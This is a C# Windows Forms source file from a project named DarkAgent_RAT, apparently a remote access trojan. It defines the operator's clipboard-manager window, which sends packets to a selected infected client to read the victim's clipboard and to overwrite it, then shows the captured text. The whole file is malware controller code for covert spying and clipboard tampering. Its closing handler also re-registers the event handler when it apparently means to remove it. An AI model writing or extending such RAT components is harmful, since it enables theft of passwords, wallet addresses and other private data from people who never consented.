using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using DarkAgent_RAT.src.Network.DataNetwork;
using DarkAgent_RAT.src.Network.DataNetwork.Packets.Send;
using DarkAgent_RAT.src.Events;

namespace DarkAgent_RAT
{
    public partial class ClipboardManager : DevComponents.DotNetBar.Office2007Form
    {
        public ClipboardManager()
        {
            InitializeComponent();
        }

        public string RemoteIP;
        public string ClientName;
	    public int ClientID;

        #region Speficic Events

        public void onGetClipboard(object o, ClipboardEventArgs e)
        {
            if (e.RemoteIP != RemoteIP)
                return;

            textBox1.Text = e.data;
        }

        #endregion

        #region Form Events

        private void ClipboardManager_Load(object sender, EventArgs e)
        {
            ClipboardEvent.Clipboard += new ClipboardHandler(onGetClipboard);
        }

        private void getToolStripMenuItem_Click(object sender, EventArgs e)
        {
            RatClientProcessor.Instance._clientList[ClientID].SendPacket(new S_GetClipboard(RatClientProcessor.Instance._clientList[ClientID]));
        }


        private void setToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if(textBox1.TextLength > 0)
                RatClientProcessor.Instance._clientList[ClientID].SendPacket(new S_SetClipboard(RatClientProcessor.Instance._clientList[ClientID], textBox1.Text));
        }

        #endregion

        private void ClipboardManager_FormClosing(object sender, FormClosingEventArgs e)
        {
            ClipboardEvent.Clipboard += new ClipboardHandler(onGetClipboard);
        }
    }
}